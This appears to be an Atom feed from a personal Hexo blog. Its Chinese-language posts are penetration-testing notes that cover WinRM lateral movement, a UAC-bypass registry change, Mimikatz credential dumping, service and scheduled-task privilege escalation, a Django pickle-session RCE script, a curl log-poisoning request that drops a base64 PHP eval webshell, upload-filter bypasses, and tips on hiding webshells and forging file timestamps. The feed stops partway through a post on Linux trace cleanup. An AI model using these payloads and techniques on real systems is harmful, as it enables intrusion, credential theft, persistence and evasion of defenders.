<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Breezy_Struggle</title>
  
  <subtitle>Select * from world where someone like u </subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-07T23:53:20.770Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Breezy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>0x04 Winrm利用</title>
    <link href="http://yoursite.com/2020/09/01/0x04-Winrm%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/0x04-Winrm%E5%88%A9%E7%94%A8/</id>
    <published>2020-09-01T00:57:09.000Z</published>
    <updated>2020-09-07T23:53:20.770Z</updated>
    
    <content type="html"><![CDATA[<p>WinRM(Windows Remote Management)远程管理，是一种允许管理员远程执行系统管理任务的服务。基于Powershell,通过HTTP（5985）或HTTPS SOAP（5986）执行通信，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。</p><blockquote><p>使用此服务需要管理员级别凭据<br>双方都需要开启winrm(Win7开始支持，Server12后默认开启)</p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--开启--</span><br><span class="line">winrm quickconfig -q   启动服务并设置为自启动 添加防火墙例外规则 添加监听配置</span><br><span class="line">或</span><br><span class="line">Powershell下  Enable-PSRemoting -Force</span><br><span class="line"></span><br><span class="line">--配置--</span><br><span class="line">winrm get winrm&#x2F;config 获取配置信息</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125; 配置信任管理源</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;&quot;&#125;  删除信任</span><br><span class="line">winrm e winrm&#x2F;config&#x2F;listener  查看监听设置</span><br><span class="line"></span><br><span class="line">winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125;   启用80端口复用</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;false&quot;&#125;  关闭</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125;  修改默认监听端口为80</span><br></pre></td></tr></table></figure><p>开启端口复用主要利用IIS自带驱动<code>http.sys</code>的端口共享功能Port Sharing。所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh http show  servicestate  查看注册的url前缀</span><br></pre></td></tr></table></figure><h3 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h3><ul><li><p>Winrs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 &quot;whoami &#x2F;all&quot; # 执行单条命令</span><br><span class="line">winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 cmd # 返回交互式cmd</span><br></pre></td></tr></table></figure></li><li><p>Powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ip&#x3D;&quot;192.168.1.116&quot;</span><br><span class="line">#$ip&#x3D;&quot;192.168.1.20&quot;</span><br><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts -Value $ip -Force</span><br><span class="line">$securePassword &#x3D; ConvertTo-SecureString -AsPlainText -Force &#39;pass&#39;</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential &#39;pass&#39;, $securePassword</span><br><span class="line">$cmd &#x3D; &#123;ls C:\users\public&#125;</span><br><span class="line">Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock $cmd</span><br><span class="line"></span><br><span class="line">Enter-PSSession -ComputerName 192.168.100.155 -Credential administrator 返回交互式shell</span><br></pre></td></tr></table></figure></li><li><p>Winrm </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm -hostname remote.domain.com -username &quot;Administrator&quot; -password &quot;secret&quot; &quot;ipconfig &#x2F;all&quot;</span><br><span class="line">winrm invoke create wmicimv2&#x2F;win32_process @&#123;commandline&#x3D;&quot;\\192.168.12.20\c\test.exe&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>HTTP Server API</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh http add urlacl url&#x3D;http:&#x2F;&#x2F;+:80&#x2F;MyUri user&#x3D;everyone  添加urlacl 管理员权限</span><br><span class="line">除此之外可以利用已存在的urlacl</span><br><span class="line">netsh http show urlacl </span><br><span class="line">http:&#x2F;&#x2F;+:80&#x2F;Temporary_Listen_Addresses&#x2F;  默认存在</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;Homework-of-C-Language&#x2F;blob&#x2F;master&#x2F;HTTPServerWebshell.cpp</span><br><span class="line">test.exe http:&#x2F;&#x2F;xx:80&#x2F;url</span><br></pre></td></tr></table></figure></li></ul><h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>通过修改注册表使得除了<code>administrator</code>之外的本地管理用户能够直接绕过UAC通过Winrm进行高权限管理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WinRM(Windows Remote Management)远程管理，是一种允许管理员远程执行系统管理任务的服务。基于Powershell,通过HTTP（5985）或HTTPS SOAP（5986）执行通信，默认情况下支持Kerberos和NTLM身份验证以及基本身份验
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>0x03 Session 切换</title>
    <link href="http://yoursite.com/2020/08/31/Runas-Tip/"/>
    <id>http://yoursite.com/2020/08/31/Runas-Tip/</id>
    <published>2020-08-31T01:39:00.000Z</published>
    <updated>2020-09-06T11:04:08.133Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>坚持记录</p></blockquote><h2 id="Runas-Tips"><a href="#Runas-Tips" class="headerlink" title="Runas Tips"></a>Runas Tips</h2><p><code>Runas</code></p><p>系统内置用户session切换命令,用于在用户间切换，无法切换到System</p><ul><li><p>交互式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;user:(user@domain|domain\user) &#x2F;noprofile command(必须为双引号包裹)</span><br></pre></td></tr></table></figure><p><img src="/images/0x03/intractive.jpg" alt="interactive"></p></li><li><p>非交互式使用Runas执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cscript  xxxx.vbs</span><br><span class="line"></span><br><span class="line">dim WshShell,cmd </span><br><span class="line">cmd&#x3D;&quot;%SystemRoot%\system32\cmd.exe&quot; </span><br><span class="line">Set WshShell&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line">WshShell.Run cmd</span><br><span class="line">WScript.Sleep 500</span><br><span class="line">WshShell.SendKeys&quot;runas &#x2F;noprofile &#x2F;user:workgroup\administrator &quot;&quot;cmd &#x2F;c netstat -ano &gt; c:\windows\temp\TS_AK74.tmp&quot;&quot;&quot;</span><br><span class="line">WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; </span><br><span class="line">WScript.Sleep 500  </span><br><span class="line">WshShell.SendKeys&quot;123456&quot;</span><br><span class="line">WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; </span><br><span class="line">WScript.Sleep 5000</span><br><span class="line">WshShell.SendKeys&quot;exit&quot;</span><br><span class="line">WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; </span><br><span class="line"></span><br><span class="line">VBS中双引号使用&quot;&quot; 进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">切换Session后对其特定的net session net use 进行查看 </span><br><span class="line">或者对特定权限用户目录进行访问而不用修改文件夹权限</span><br><span class="line">icacls fle&#x2F;dir</span><br><span class="line">icacls file&#x2F;dir &#x2F;grant user:(OI)(CI)(I) F &#x2F;T</span><br></pre></td></tr></table></figure><p><img src="/images/0x03/nonintractive.jpg" alt="/images/0x03"></p></li><li><p>蜜罐</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas 使用netonly参数在网络认证时才会发送密码进行认证  在本地可以通过输入任意密码启动cmd session作用范围为当前用户</span><br><span class="line">密码会被写入到lsass进程中 </span><br><span class="line">runas &#x2F;netonly &#x2F;user:xxx cmd.exe</span><br><span class="line"></span><br><span class="line">可用来设置蜜罐账户 检测蜜罐密码是否被使用</span><br></pre></td></tr></table></figure><p><img src="/images/0x03/netonly.jpg" alt="netonly"><br>通过<code>/netonly</code>参数，只要不经过网络认证就不会对身份进行检测，任意输入密码启动为<code>administrator</code>会话,继续查看当前用户权限依然为本地用户。</p></li></ul><p>通过<code>Mimikatz</code>抓取密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/images/0x03/mimika.jpg" alt="mimikatz"></p><p>任意输入的密码被抓取成功</p><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><ul><li>sc<br>sc 是内置的服务配置命令，可以通过管理权限添加服务从而以服务权限运行程序。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sc query xxxx     查询服务状态</span><br><span class="line">sc create xxxx binpath&#x3D; &quot;c:\windows\system32\cmd.exe &#x2F;c whoami &gt; c:\windows\temp\TS_AK7J.tmp&quot;   创建服务</span><br><span class="line">sc config xxxx obj&#x3D; localsystem start&#x3D; auto binpath&#x3D; &quot;c:\windows\system32\cmd.exe &#x2F;c whoami &gt; c:\windows\temp\TS_AK7J.tmp&quot;</span><br><span class="line">sc qc xxxxx   查询配置信息</span><br><span class="line">sc start xxxxx</span><br><span class="line">sc stop xxxx</span><br><span class="line">sc delete xxxxx</span><br><span class="line">sc config xxxx start&#x3D; disabled&#x2F;demand    禁用或手动</span><br></pre></td></tr></table></figure>sc命令支持RPC调用，可以通过UNC路径远程创建服务<code>sc \\ip create xxxxx</code>, 其中obj可以设置为<code>localsystem</code>、<code>本机存在的用户名</code><br>如果需要认证则要config单独配置<code>password</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config  xxxx obj&#x3D; &quot;user&quot;  password&#x3D;&quot;$pass&quot;</span><br></pre></td></tr></table></figure>用户列表可以在<code>services.msc</code> 中配置服务的属性登录选项中选择高级进行查找</li></ul><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><ul><li>at<br>低版本系统(Win7及以下)支持at命令，默认以system启动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\ip   time command</span><br><span class="line">配合net time \\ip 获取远程时间</span><br></pre></td></tr></table></figure></li><li>schtasks<br>高版本废弃at命令需要使用更多功能的<code>schtasks</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;TN 任务名  &#x2F;SC 周期(daily&#x2F;weekly) &#x2F;ST 时间(23:00) &#x2F;TR 运行程序(notepad.exe) &#x2F;RU 执行用户(system)</span><br><span class="line">schtasks &#x2F;query [&#x2F;TN TestService2]</span><br><span class="line">schtasks &#x2F;delete &#x2F;TN &#x2F;F</span><br></pre></td></tr></table></figure></li></ul><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>窃取用户Token获取system权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icognito.exe</span><br><span class="line">Cobaltstrike steal_token</span><br></pre></td></tr></table></figure><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec -accepteula -i cmd -s 启动system权限命令行</span><br><span class="line"></span><br><span class="line">创建system权限服务打开命名管道，通过命名管道执行命令</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;坚持记录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Runas-Tips&quot;&gt;&lt;a href=&quot;#Runas-Tips&quot; class=&quot;headerlink&quot; title=&quot;Runas Tips&quot;&gt;&lt;/a&gt;Runas Tips&lt;/h2&gt;&lt;p
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>0x02 比赛分享</title>
    <link href="http://yoursite.com/2020/08/31/0x02-%E6%AF%94%E8%B5%9B%E5%88%86%E4%BA%AB/"/>
    <id>http://yoursite.com/2020/08/31/0x02-%E6%AF%94%E8%B5%9B%E5%88%86%E4%BA%AB/</id>
    <published>2020-08-31T01:15:46.000Z</published>
    <updated>2020-08-31T01:24:50.338Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打比赛才会在当前的满足之中找到真实自我</p></blockquote><h2 id="外网"><a href="#外网" class="headerlink" title="外网:"></a>外网:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DNS域传送  发现目标</span><br><span class="line">dig axfr @server_ip    query_domain</span><br><span class="line"></span><br><span class="line">nslookup</span><br><span class="line">&gt;server server_ip </span><br><span class="line">&gt;ls query_domain</span><br></pre></td></tr></table></figure><h3 id="1、PHP-反序列化字符串逃逸"><a href="#1、PHP-反序列化字符串逃逸" class="headerlink" title="1、PHP 反序列化字符串逃逸"></a>1、PHP 反序列化字符串逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">任意文件读取 file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd 为进程当前工作目录</span><br><span class="line">如Web应用为运行的当前脚本目录 </span><br><span class="line">通过该方式可以任意读取文件</span><br><span class="line"></span><br><span class="line">反序列化字符串逃逸 可参考去年的Joomla 3.4.0-3.4.6 由于解析字符串单双引号对\0的处理差异 导致字符串逃逸</span><br><span class="line">通过中间处理过程对序列化内容过滤或者格式化引起字符的增加和减少</span><br></pre></td></tr></table></figure><h3 id="2、Django-RCE"><a href="#2、Django-RCE" class="headerlink" title="2、Django RCE"></a>2、Django RCE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞&#123;&#125;      通过&#39;&#123;&#125;&#39;.format(param)    param输入为&#123;&#125; 内接django变量名可以读取变量值</span><br><span class="line">通过&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; 读取secretkey</span><br><span class="line">由于版本低于1.6   可以通过session反序列化RCE</span><br><span class="line"># coding: utf-8</span><br><span class="line">from django.contrib.sessions.serializers import PickleSerializer</span><br><span class="line">from django.core import signing</span><br><span class="line">from django.conf import settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY&#x3D;&#39;xxxxxxxxxxxxxxxxxxx&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Run(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system,(&#39;xxxxxx&#39;,))</span><br><span class="line"></span><br><span class="line">sess &#x3D; signing.dumps(</span><br><span class="line">    obj&#x3D;GetShellWithPython(),</span><br><span class="line">    serializer&#x3D;PickleSerializer,</span><br><span class="line">    salt&#x3D;&#39;django.contrib.sessions.backends.signed_cookies&#39;</span><br><span class="line">)</span><br><span class="line">import urllib2</span><br><span class="line">import cookielib</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;url&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Cookie&#39;:&#39;sessionid&#x3D;&quot;%s&quot;&#39; %(sess)&#125;</span><br><span class="line">request &#x3D; urllib2.Request(url,headers &#x3D; headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">搭建目标对应版本django  </span><br><span class="line">django startserver hello</span><br><span class="line">cd hello&#x2F;hello</span><br><span class="line">在django上下文环境执行该脚本实现RCE</span><br><span class="line"></span><br><span class="line">也可以自行通过Curl发送Cookie</span><br><span class="line">curl url --cookie &quot;sessionid&#x3D;cookie&quot;</span><br></pre></td></tr></table></figure><h3 id="3、PHP-CMS-Monstra"><a href="#3、PHP-CMS-Monstra" class="headerlink" title="3、PHP CMS Monstra"></a>3、PHP CMS Monstra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 3.04 后台进入可上传php7绕过黑名单过滤    漏洞原因为可能发行时未考虑php7兼容性</span><br><span class="line">而在某些版本的系统下 全局配置中 有添加针对php7解析的内容</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;mime.types</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php7.0.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">参考 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7850</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;xxxxxxx&#x2F;storage&#x2F;database&#x2F;users.table.xml  泄露敏感信息--用户账号及加密后hash</span><br><span class="line">加密算法在 engine&#x2F;security.php   加上盐值一般未修改  可进行枚举</span><br><span class="line">define(&#39;MONSTRA_PASSWORD_SALT&#39;, &#39;YOUR_SALT_HERE&#39;);</span><br><span class="line"> md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));</span><br><span class="line"></span><br><span class="line">这边的做法是后台验证码 任意文件包含  通过包含日志文件getshell</span><br><span class="line">因为日志太多不建议直接写shell  通过访问存在路径作为参数写入</span><br><span class="line">curl -v &quot;http:&#x2F;&#x2F;url&#x2F;index.php?&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;plugins&#x2F;captcha&#x2F;crypt&#x2F;cryptogr4php.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydjb3JuJ10pOz8+&#39;))?&gt;&quot;</span><br><span class="line">会提示400  但是能够写入到access_log下</span><br><span class="line">利用包含生成shell     Burp直接发送+会被记录成完整的+号 随后才会被中间件解析成空格</span><br></pre></td></tr></table></figure><h3 id="4、IIS-8-5-PHP-上传"><a href="#4、IIS-8-5-PHP-上传" class="headerlink" title="4、IIS 8.5 +PHP 上传"></a>4、IIS 8.5 +PHP 上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php cgi.fix_pathinfo   配置漏洞   访问 xxx.jpg&#x2F;.php 实现解析</span><br><span class="line"></span><br><span class="line">上传Windows NTF 文件绕过后缀黑名单</span><br><span class="line">xxxxx::$INDEX_ALLOCATION  可创建 xxxx 文件夹  配合 IIS6.0目录解析漏洞使用</span><br><span class="line">test.php:a.jpg  创建文件为test.php 内容为空   结合 windows 特殊通配符&gt;&gt;&gt; 和??? 对文件内容写入</span><br><span class="line">test.php::$DATA\1.jpg            创建1.jpg    结合解析漏洞使用</span><br><span class="line"></span><br><span class="line">Windows格式化文件名绕过黑名单</span><br><span class="line">test.php.</span><br><span class="line">test.php空格</span><br><span class="line">test.php%0a</span><br><span class="line">test.php_</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上传后通过Windows 短文件名 结合时间戳爆破shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;IIS_shortname_Scanner.git</span><br></pre></td></tr></table></figure><h3 id="5、ThinkPHP5"><a href="#5、ThinkPHP5" class="headerlink" title="5、ThinkPHP5"></a>5、ThinkPHP5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段缓存漏洞  通过注入点多语句执行，新建表并修改字段名称，写入到xxxx.php中getshell</span><br><span class="line">TP通过数组提交可绕过过滤 </span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;153286.html</span><br></pre></td></tr></table></figure><h3 id="6-OA"><a href="#6-OA" class="headerlink" title="6.OA"></a>6.OA</h3><p>shiro 721 反序列化    爆破key</p><h3 id="8-dedecms"><a href="#8-dedecms" class="headerlink" title="8.dedecms"></a>8.dedecms</h3><p>后台弱口令  后台编辑模板 getshell </p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Weblogic  2019-2725</span><br><span class="line">Atlassian  CVE-2019-11580  rce   https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-11580</span><br><span class="line"></span><br><span class="line">ms17_010</span><br><span class="line">msf win8版本可打2012 某些版本</span><br><span class="line"></span><br><span class="line">net sessions  查看远程连接记录(被连)</span><br><span class="line"></span><br><span class="line">cmdkey &#x2F;list</span><br><span class="line">sekurlsa::ssp  获取远程连接凭证</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;打比赛才会在当前的满足之中找到真实自我&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;外网&quot;&gt;&lt;a href=&quot;#外网&quot; class=&quot;headerlink&quot; title=&quot;外网:&quot;&gt;&lt;/a&gt;外网:&lt;/h2&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>0x01 迟到的第二篇文</title>
    <link href="http://yoursite.com/2020/08/28/0x01-%E8%BF%9F%E5%88%B0%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87/"/>
    <id>http://yoursite.com/2020/08/28/0x01-%E8%BF%9F%E5%88%B0%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87/</id>
    <published>2020-08-28T14:24:15.000Z</published>
    <updated>2020-08-29T00:52:44.946Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 睡眠不佳 !!! 还望见谅</p></blockquote><p>第二篇文章记录一点内网渗透时候的Tip(当前遇到)</p><h2 id="0x00-Attention"><a href="#0x00-Attention" class="headerlink" title="0x00 Attention"></a>0x00 Attention</h2><ol><li>Getshell 后针对解释性语言如PHP等可热加载解析的可以适当将shell藏到正常目录下，要修改内容以防Hash匹配，Linux可以使用<code>touch</code>命令修改文件时间<code>touch -r old_date_file your_evil_shell</code>,Windows可以结合<code>Powershell</code>更改文件的创建访问及修改时间。</li></ol><p><code>(ls)[num]|fl *</code><br>形如<code>$(ls)</code>返回当前目录下的文件，数组序号对单文件进行选择，将结果通过管道符给<code>fl</code>命令输出</p><p><img src="/images/0x01/ls.png" alt="ls"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(Get-ChildItem file_name).CreationTime&#x3D;&#39;2020&#x2F;6&#x2F;24 21:23:52&#39;    对指定时间进行修改</span><br><span class="line">为了更方便可以改为</span><br><span class="line">(Get-ChildItem file_name).CreationTime&#x3D;(Get-ChildItem exist_file_name).CreationTime</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt; 睡眠不佳 !!! 还望见谅&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第二篇文章记录一点内网渗透时候的Tip(当前遇到)&lt;/p&gt;
&lt;h2 id=&quot;0x00-Attention&quot;&gt;&lt;a href=&quot;#0x00-Attention&quot; class=&quot;h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>0x00 Linux 痕迹清理</title>
    <link href="http://yoursite.com/2020/08/03/0x00/"/>
    <id>http://yoursite.com/2020/08/03/0x00/</id>
    <published>2020-08-03T14:32:57.000Z</published>
    <updated>2020-08-04T01:14:52.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-痕迹清理"><a href="#Linux-痕迹清理" class="headerlink" title="Linux 痕迹清理"></a>Linux 痕迹清理</h2><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>history 命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">history 查看当前session历史命令缓冲区及历史命令文件</span><br><span class="line">高级用法</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&#39;%F %T &#39;</span><br><span 